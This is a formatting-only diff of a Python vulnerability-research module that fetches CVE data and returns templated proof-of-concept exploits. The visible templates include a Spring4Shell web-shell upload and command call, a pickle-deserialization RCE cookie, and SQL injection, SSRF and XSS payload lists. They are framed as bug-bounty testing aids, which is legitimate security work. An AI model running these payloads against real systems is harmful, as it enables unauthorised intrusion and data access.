@@ -18,12 +18,12 @@ Data Sources:
 
 Usage:
     from tools.vuln_researcher import VulnerabilityResearcher
-    
+
     researcher = VulnerabilityResearcher()
-    
+
     # Research a CVE
     cve_info = researcher.research_cve("CVE-2024-21626")
-    
+
     # Generate custom PoC
     poc = researcher.generate_custom_poc(
         vuln_type="rce",
@@ -33,7 +33,7 @@ Usage:
             "language": "Java"
         }
     )
-    
+
     # Find similar bounties
     similar = researcher.find_similar_bounties("SQL injection", min_payout=1000)
 """
@@ -56,6 +56,7 @@ logger = logging.getLogger("elengenix.vuln_researcher")
 @dataclass
 class CVEResearchResult:
     """Complete CVE research result."""
+
     cve_id: str
     cvss_score: float
     severity: str
@@ -74,6 +75,7 @@ class CVEResearchResult:
 @dataclass
 class ExploitCondition:
     """Requirements for exploitation."""
+
     prerequisite: str
     details: str
     how_to_check: str
@@ -83,6 +85,7 @@ class ExploitCondition:
 @dataclass
 class DisclosedBounty:
     """Similar disclosed bounty report."""
+
     title: str
     program: str
     severity: str
@@ -97,6 +100,7 @@ class DisclosedBounty:
 @dataclass
 class CustomPoC:
     """Generated custom PoC."""
+
     code: str
     language: str
     target_framework: str
@@ -108,42 +112,49 @@ class CustomPoC:
 class VulnerabilityResearcher:
     """
     AI-powered vulnerability research engine.
-    
+
     Aggregates data from multiple sources and uses AI
     to generate actionable exploitation intelligence.
     """
-    
+
     # API Endpoints
     NVD_API_BASE = "https://services.nvd.nist.gov/rest/json/cves/2.0"
     GITHUB_ADVISORIES_API = "https://api.github.com/advisories"
     EXPLOITDB_API = "https://www.exploit-db.com/api"
-    
+
     # Cache settings
     CACHE_DIR = Path(".cache/vuln_research")
     CACHE_TTL_HOURS = 24
-    
+
     def __init__(self, ai_client=None):
         """Initialize researcher with optional AI client."""
         self.ai_client = ai_client
         self.session = requests.Session()
-        self.session.headers.update({
-            "User-Agent": "Elengenix-Security-Research/2.0",
-            "Accept": "application/json",
-        })
-        
+        self.session.headers.update(
+            {
+                "User-Agent": "Elengenix-Security-Research/2.0",
+                "Accept": "application/json",
+            }
+        )
+
         # Ensure cache directory exists
         self.CACHE_DIR.mkdir(parents=True, exist_ok=True)
-        
+
         # Load local vulnerability patterns
         self.vuln_patterns = self._load_vulnerability_patterns()
-        
+
         logger.info("VulnerabilityResearcher initialized")
-    
+
     def _load_vulnerability_patterns(self) -> Dict[str, Any]:
         """Load known vulnerability exploitation patterns."""
         return {
             "rce": {
-                "common_vectors": ["deserialization", "command_injection", "template_injection", "file_upload"],
+                "common_vectors": [
+                    "deserialization",
+                    "command_injection",
+                    "template_injection",
+                    "file_upload",
+                ],
                 "prerequisites": ["user_input_handling", "unsafe_eval", "weak_sandbox"],
                 "impact_score": 1.0,
             },
@@ -173,31 +184,31 @@ class VulnerabilityResearcher:
                 "impact_score": 0.85,
             },
         }
-    
+
     def _get_cache_path(self, key: str) -> Path:
         """Get cache file path for a key."""
-        safe_key = re.sub(r'[^a-zA-Z0-9_-]', '_', key)
+        safe_key = re.sub(r"[^a-zA-Z0-9_-]", "_", key)
         return self.CACHE_DIR / f"{safe_key}.json"
-    
+
     def _load_cache(self, key: str) -> Optional[Dict]:
         """Load cached data if still valid."""
         cache_path = self._get_cache_path(key)
         if not cache_path.exists():
             return None
-        
+
         # Check TTL
         mtime = cache_path.stat().st_mtime
         age_hours = (time.time() - mtime) / 3600
         if age_hours > self.CACHE_TTL_HOURS:
             return None
-        
+
         try:
             with open(cache_path, "r") as f:
                 return json.load(f)
         except Exception as e:
             logger.debug(f"Cache load failed: {e}")
             return None
-    
+
     def _save_cache(self, key: str, data: Dict) -> None:
         """Save data to cache."""
         cache_path = self._get_cache_path(key)
@@ -206,47 +217,49 @@ class VulnerabilityResearcher:
                 json.dump(data, f, indent=2, default=str)
         except Exception as e:
             logger.debug(f"Cache save failed: {e}")
-    
+
     def research_cve(self, cve_id: str) -> Optional[CVEResearchResult]:
         """
         Research a CVE from multiple sources.
-        
+
         Args:
             cve_id: CVE identifier (e.g., "CVE-2024-21626")
-            
+
         Returns:
             Complete research result or None if not found
         """
         cve_id = cve_id.upper().strip()
-        if not re.match(r'^CVE-\d{4}-\d{4,}$', cve_id):
+        if not re.match(r"^CVE-\d{4}-\d{4,}$", cve_id):
             logger.error(f"Invalid CVE format: {cve_id}")
             return None
-        
+
         # Check cache
         cache_key = f"cve_{cve_id}"
         cached = self._load_cache(cache_key)
         if cached:
             logger.info(f"Using cached data for {cve_id}")
             return CVEResearchResult(**cached)
-        
+
         # Fetch from NVD
         nvd_data = self._fetch_nvd_data(cve_id)
         if not nvd_data:
             logger.warning(f"No NVD data found for {cve_id}")
             return None
-        
+
         # Fetch GitHub advisories
         github_advisories = self._fetch_github_advisories(cve_id)
-        
+
         # Search for public PoCs
         available_pocs = self._find_public_pocs(cve_id)
-        
+
         # Extract exploitation conditions
         exploit_conditions = self._analyze_exploitation_conditions(nvd_data)
-        
+
         # Generate AI summary if client available
-        ai_summary = self._generate_ai_summary(nvd_data, exploit_conditions) if self.ai_client else ""
-        
+        ai_summary = (
+            self._generate_ai_summary(nvd_data, exploit_conditions) if self.ai_client else ""
+        )
+
         # Build result
         result = CVEResearchResult(
             cve_id=cve_id,
@@ -263,13 +276,13 @@ class VulnerabilityResearcher:
             ai_summary=ai_summary,
             confidence=self._calculate_confidence(nvd_data, available_pocs),
         )
-        
+
         # Cache result
         self._save_cache(cache_key, result.__dict__)
-        
+
         logger.info(f"Research complete for {cve_id} (confidence: {result.confidence:.2f})")
         return result
-    
+
     def _fetch_nvd_data(self, cve_id: str) -> Optional[Dict[str, Any]]:
         """Fetch CVE data from NVD API."""
         try:
@@ -277,12 +290,12 @@ class VulnerabilityResearcher:
             resp = self.session.get(url, timeout=30)
             resp.raise_for_status()
             data = resp.json()
-            
+
             if not data.get("vulnerabilities"):
                 return None
-            
+
             cve_data = data["vulnerabilities"][0]["cve"]
-            
+
             # Extract CVSS score
             cvss_score = 0.0
             severity = "unknown"
@@ -295,21 +308,21 @@ class VulnerabilityResearcher:
                 cvss_data = metrics["cvssMetricV30"][0]["cvssData"]
                 cvss_score = cvss_data.get("baseScore", 0.0)
                 severity = cvss_data.get("baseSeverity", "unknown").lower()
-            
+
             # Extract description
             description = ""
             for desc in cve_data.get("descriptions", []):
                 if desc.get("lang") == "en":
                     description = desc.get("value", "")
                     break
-            
+
             # Extract references
             references = []
             for ref in cve_data.get("references", []):
                 url = ref.get("url", "")
                 if url:
                     references.append(url)
-            
+
             # Extract affected products
             affected = []
             for config in cve_data.get("configurations", []):
@@ -318,7 +331,7 @@ class VulnerabilityResearcher:
                         cpe = match.get("criteria", "")
                         if cpe:
                             affected.append(cpe)
-            
+
             return {
                 "cve_id": cve_id,
                 "cvss_score": cvss_score,
@@ -329,11 +342,11 @@ class VulnerabilityResearcher:
                 "published": cve_data.get("published", ""),
                 "last_modified": cve_data.get("lastModified", ""),
             }
-            
+
         except Exception as e:
             logger.error(f"Failed to fetch NVD data for {cve_id}: {e}")
             return None
-    
+
     def _fetch_github_advisories(self, cve_id: str) -> List[Dict[str, Any]]:
         """Fetch GitHub Security Advisories for CVE."""
         advisories = []
@@ -344,37 +357,35 @@ class VulnerabilityResearcher:
             if resp.status_code == 200:
                 data = resp.json()
                 for adv in data:
-                    advisories.append({
-                        "ghsa_id": adv.get("ghsa_id", ""),
-                        "summary": adv.get("summary", ""),
-                        "severity": adv.get("severity", ""),
-                        "cvss_score": adv.get("cvss", {}).get("score", 0),
-                        "vulnerable_packages": [
-                            v.get("package", {}).get("name", "")
-                            for v in adv.get("vulnerabilities", [])
-                        ],
-                    })
+                    advisories.append(
+                        {
+                            "ghsa_id": adv.get("ghsa_id", ""),
+                            "summary": adv.get("summary", ""),
+                            "severity": adv.get("severity", ""),
+                            "cvss_score": adv.get("cvss", {}).get("score", 0),
+                            "vulnerable_packages": [
+                                v.get("package", {}).get("name", "")
+                                for v in adv.get("vulnerabilities", [])
+                            ],
+                        }
+                    )
         except Exception as e:
             logger.debug(f"GitHub advisories fetch failed: {e}")
         return advisories
-    
+
     def _find_public_pocs(self, cve_id: str) -> List[Dict[str, str]]:
         """Find publicly available PoCs for CVE."""
         pocs = []
-        
+
         # Check Exploit-DB
         try:
             search_url = f"https://www.exploit-db.com/search?cve={cve_id}"
             resp = self.session.get(search_url, timeout=15)
             if resp.status_code == 200 and "No results" not in resp.text:
-                pocs.append({
-                    "source": "Exploit-DB",
-                    "url": search_url,
-                    "type": "exploit"
-                })
+                pocs.append({"source": "Exploit-DB", "url": search_url, "type": "exploit"})
         except Exception:
             pass
-        
+
         # Check GitHub for PoC repos
         try:
             github_search = f"https://api.github.com/search/repositories?q={cve_id}+poc+in:name,description&sort=stars&order=desc"
@@ -382,21 +393,23 @@ class VulnerabilityResearcher:
             if resp.status_code == 200:
                 data = resp.json()
                 for repo in data.get("items", [])[:3]:  # Top 3
-                    pocs.append({
-                        "source": "GitHub",
-                        "url": repo.get("html_url", ""),
-                        "type": "repository",
-                        "stars": repo.get("stargazers_count", 0),
-                    })
+                    pocs.append(
+                        {
+                            "source": "GitHub",
+                            "url": repo.get("html_url", ""),
+                            "type": "repository",
+                            "stars": repo.get("stargazers_count", 0),
+                        }
+                    )
         except Exception:
             pass
-        
+
         return pocs
-    
+
     def _analyze_exploitation_conditions(self, nvd_data: Dict[str, Any]) -> Dict[str, Any]:
         """Analyze CVE description to extract exploitation conditions."""
         description = nvd_data.get("description", "").lower()
-        
+
         conditions = {
             "prerequisites": [],
             "attack_vector": "unknown",
@@ -404,45 +417,50 @@ class VulnerabilityResearcher:
             "privileges_required": "unknown",
             "user_interaction": "unknown",
         }
-        
+
         # Detect attack vector
         if "network" in description or "remote" in description:
             conditions["attack_vector"] = "network"
         elif "local" in description or "adjacent" in description:
             conditions["attack_vector"] = "local"
-        
+
         # Detect prerequisites
         prereq_keywords = {
-            "authentication": ["authenticated", "login required", "valid credentials", "user account"],
+            "authentication": [
+                "authenticated",
+                "login required",
+                "valid credentials",
+                "user account",
+            ],
             "admin_access": ["administrator", "privileged user", "root access"],
             "specific_config": ["specific configuration", "misconfiguration", "enabled"],
             "user_interaction": ["user interaction", "social engineering", "trick user"],
         }
-        
+
         for prereq, keywords in prereq_keywords.items():
             if any(kw in description for kw in keywords):
                 conditions["prerequisites"].append(prereq)
-        
+
         return conditions
-    
-    def _generate_ai_summary(self, nvd_data: Dict[str, Any], 
-                            exploit_conditions: Dict[str, Any]) -> str:
+
+    def _generate_ai_summary(
+        self, nvd_data: Dict[str, Any], exploit_conditions: Dict[str, Any]
+    ) -> str:
         """Generate AI summary of vulnerability."""
         if not self.ai_client:
             return ""
-        
+
         try:
             # Would call AI client here
             return "AI summary generation requires configured AI client"
         except Exception as e:
             logger.debug(f"AI summary generation failed: {e}")
             return ""
-    
-    def _calculate_confidence(self, nvd_data: Dict[str, Any], 
-                             pocs: List[Dict]) -> float:
+
+    def _calculate_confidence(self, nvd_data: Dict[str, Any], pocs: List[Dict]) -> float:
         """Calculate confidence score based on data completeness."""
         score = 0.0
-        
+
         # Base score for having NVD data
         if nvd_data.get("cvss_score", 0) > 0:
             score += 0.3
@@ -452,37 +470,38 @@ class VulnerabilityResearcher:
             score += 0.2
         if nvd_data.get("affected"):
             score += 0.1
-        
+
         # Bonus for available PoCs
         if pocs:
             score += min(0.2, len(pocs) * 0.1)
-        
+
         return min(1.0, score)
-    
-    def generate_custom_poc(self, vuln_type: str, 
-                           target_context: Dict[str, Any]) -> Optional[CustomPoC]:
+
+    def generate_custom_poc(
+        self, vuln_type: str, target_context: Dict[str, Any]
+    ) -> Optional[CustomPoC]:
         """
         Generate custom PoC based on vulnerability type and target context.
-        
+
         Args:
             vuln_type: Type of vulnerability (rce, sqli, ssrf, etc.)
             target_context: Dict with framework, version, language, etc.
-            
+
         Returns:
             Custom PoC or None
         """
         vuln_type = vuln_type.lower().strip()
-        
+
         # Get patterns for this vuln type
         patterns = self.vuln_patterns.get(vuln_type)
         if not patterns:
             logger.warning(f"Unknown vulnerability type: {vuln_type}")
             return None
-        
+
         framework = target_context.get("framework", "").lower()
         language = target_context.get("language", "").lower()
         version = target_context.get("version", "")
-        
+
         # Generate framework-specific PoC
         if vuln_type == "rce":
             code = self._generate_rce_poc(framework, language, version)
@@ -494,7 +513,7 @@ class VulnerabilityResearcher:
             code = self._generate_xss_poc(framework, language, version)
         else:
             code = self._generate_generic_poc(vuln_type, framework, language)
-        
+
         return CustomPoC(
             code=code,
             language=language or "python",
@@ -511,12 +530,11 @@ class VulnerabilityResearcher:
                 "Implement proper access controls",
             ],
         )
-    
-    def _generate_rce_poc(self, framework: str, language: str, 
-                         version: str) -> str:
+
+    def _generate_rce_poc(self, framework: str, language: str, version: str) -> str:
         """Generate RCE PoC for specific framework."""
         if "spring" in framework:
-            return '''# Spring Boot RCE Test
+            return """# Spring Boot RCE Test
 # For CVE-2022-22965 (Spring4Shell) or similar
 
 import requests
@@ -542,9 +560,9 @@ print(f"Upload status: {resp.status_code}")
 shell_url = f"{TARGET}/tomcatwar.jsp?pwd=j&cmd=whoami"
 resp = requests.get(shell_url)
 print(f"Shell response: {resp.text}")
-'''
+"""
         elif "django" in framework:
-            return '''# Django RCE via pickle deserialization
+            return """# Django RCE via pickle deserialization
 import pickle
 import base64
 import requests
@@ -564,9 +582,9 @@ cookie = base64.b64encode(payload).decode()
 cookies = {"session": cookie}
 resp = requests.get(TARGET, cookies=cookies)
 print(f"Response: {resp.status_code}")
-'''
+"""
         else:
-            return '''# Generic RCE Test Template
+            return """# Generic RCE Test Template
 import requests
 import sys
 
@@ -588,12 +606,11 @@ for payload in payloads:
     if "root" in resp.text or "uid=" in resp.text:
         print(f"[+] RCE found with: {payload}")
         break
-'''
-    
-    def _generate_sqli_poc(self, framework: str, language: str, 
-                          version: str) -> str:
+"""
+
+    def _generate_sqli_poc(self, framework: str, language: str, version: str) -> str:
         """Generate SQL injection PoC."""
-        return '''# SQL Injection Test
+        return """# SQL Injection Test
 import requests
 import time
 
@@ -626,12 +643,11 @@ for payload, delay in blind_payloads:
     elapsed = time.time() - start
     if elapsed > delay - 1:
         print(f"  [!] Time-based SQLi confirmed: {payload[:30]}")
-'''
-    
-    def _generate_ssrf_poc(self, framework: str, language: str, 
-                          version: str) -> str:
+"""
+
+    def _generate_ssrf_poc(self, framework: str, language: str, version: str) -> str:
         """Generate SSRF PoC."""
-        return '''# SSRF (Server-Side Request Forgery) Test
+        return """# SSRF (Server-Side Request Forgery) Test
 import requests
 import urllib.parse
 
@@ -652,7 +668,7 @@ print("[+] Testing for SSRF...")
 for ssrf_url in ssrf_targets:
     payload = urllib.parse.quote(ssrf_url)
     resp = requests.get(TARGET, params={"url": ssrf_url})
-    
+
     indicators = ["ami", "instance-id", "root:x", "hostname", "upstream"]
     if any(ind in resp.text.lower() for ind in indicators):
         print(f"  [!] SSRF confirmed: {ssrf_url}")
@@ -660,12 +676,11 @@ for ssrf_url in ssrf_targets:
         break
     else:
         print(f"  [ ] Tested: {ssrf_url[:40]}")
-'''
-    
-    def _generate_xss_poc(self, framework: str, language: str, 
-                          version: str) -> str:
+"""
+
+    def _generate_xss_poc(self, framework: str, language: str, version: str) -> str:
         """Generate XSS PoC."""
-        return '''# XSS (Cross-Site Scripting) Test
+        return """# XSS (Cross-Site Scripting) Test
 import requests
 import html
 
@@ -684,7 +699,7 @@ xss_payloads = [
 print("[+] Testing for XSS...")
 for payload in xss_payloads:
     resp = requests.get(TARGET, params={"q": payload})
-    
+
     # Check if payload is reflected without encoding
     if payload in resp.text:
         print(f"  [!] XSS confirmed (reflected): {payload[:40]}")
@@ -693,12 +708,11 @@ for payload in xss_payloads:
         print(f"  [!] Possible XSS (partial reflection): {payload[:40]}")
     else:
         print(f"  [ ] Tested: {payload[:40]}")
-'''
-    
-    def _generate_generic_poc(self, vuln_type: str, framework: str, 
-                             language: str) -> str:
+"""
+
+    def _generate_generic_poc(self, vuln_type: str, framework: str, language: str) -> str:
         """Generate generic PoC template."""
-        return f'''# {vuln_type.upper()} Test Template
+        return f"""# {vuln_type.upper()} Test Template
 import requests
 import sys
 
@@ -712,25 +726,25 @@ print(f"[+] Testing {{vuln_type}} on {{TARGET}}")
 resp = requests.get(TARGET)
 print(f"Status: {{resp.status_code}}")
 # TODO: Add specific exploitation logic
-'''
-    
-    def find_similar_bounties(self, vuln_type: str, 
-                             min_payout: int = 500,
-                             platform: str = "all") -> List[DisclosedBounty]:
+"""
+
+    def find_similar_bounties(
+        self, vuln_type: str, min_payout: int = 500, platform: str = "all"
+    ) -> List[DisclosedBounty]:
         """
         Find similar disclosed bug bounties.
-        
+
         Args:
             vuln_type: Vulnerability type
             min_payout: Minimum payout to include
             platform: "hackerone", "bugcrowd", "intigriti", or "all"
-            
+
         Returns:
             List of similar disclosed bounties
         """
         # This would integrate with HackerOne/Bugcrowd APIs
         # For now, return curated examples
-        
+
         bounty_database = [
             DisclosedBounty(
                 title="RCE via ImageMagick via file upload",
@@ -766,7 +780,7 @@ print(f"Status: {{resp.status_code}}")
                 reporter="@ssrf_hunter",
             ),
         ]
-        
+
         # Filter by vuln type similarity
         vuln_keywords = {
             "rce": ["rce", "remote code", "command injection", "deserialization"],
@@ -776,9 +790,9 @@ print(f"Status: {{resp.status_code}}")
             "xss": ["xss", "cross-site", "scripting"],
             "auth": ["auth", "bypass", "authentication"],
         }
-        
+
         keywords = vuln_keywords.get(vuln_type.lower(), [vuln_type.lower()])
-        
+
         filtered = []
         for bounty in bounty_database:
             # Check if any keyword matches
@@ -788,16 +802,16 @@ print(f"Status: {{resp.status_code}}")
                 payout_num = int(bounty.payout.replace("$", "").replace(",", ""))
                 if payout_num >= min_payout:
                     filtered.append(bounty)
-        
+
         return filtered
-    
+
     def get_exploitation_guide(self, vuln_type: str) -> Dict[str, Any]:
         """
         Get comprehensive exploitation guide for vulnerability type.
-        
+
         Args:
             vuln_type: Type of vulnerability
-            
+
         Returns:
             Guide with techniques, tools, and methodology
         """
@@ -871,32 +885,35 @@ print(f"Status: {{resp.status_code}}")
                 "cvss_base": 8.2,
             },
         }
-        
-        return guides.get(vuln_type.lower(), {
-            "description": f"Information about {vuln_type}",
-            "common_vectors": [],
-            "detection_methods": [],
-            "exploitation_tools": [],
-            "impact": "Unknown",
-            "cvss_base": 5.0,
-        })
+
+        return guides.get(
+            vuln_type.lower(),
+            {
+                "description": f"Information about {vuln_type}",
+                "common_vectors": [],
+                "detection_methods": [],
+                "exploitation_tools": [],
+                "impact": "Unknown",
+                "cvss_base": 5.0,
+            },
+        )
 
 
 def run_cli():
     """Command-line interface for vulnerability research."""
     import sys
-    
+
     if len(sys.argv) < 2:
         print("Usage: python vuln_researcher.py <cve-id|vuln-type> [framework] [version]")
         print("Examples:")
         print("  python vuln_researcher.py CVE-2024-21626")
         print("  python vuln_researcher.py rce Spring-Boot 2.7.5")
         sys.exit(1)
-    
+
     arg = sys.argv[1]
-    
+
     researcher = VulnerabilityResearcher()
-    
+
     # Check if CVE
     if arg.upper().startswith("CVE-"):
         result = researcher.research_cve(arg)
@@ -917,16 +934,16 @@ def run_cli():
         # Generate PoC
         framework = sys.argv[2] if len(sys.argv) > 2 else "generic"
         version = sys.argv[3] if len(sys.argv) > 3 else ""
-        
+
         poc = researcher.generate_custom_poc(
             vuln_type=arg,
             target_context={
                 "framework": framework,
                 "version": version,
                 "language": "python",
-            }
+            },
         )
-        
+
         if poc:
             print(f"\n{'='*70}")
             print(f"Generated PoC: {arg} on {framework}")
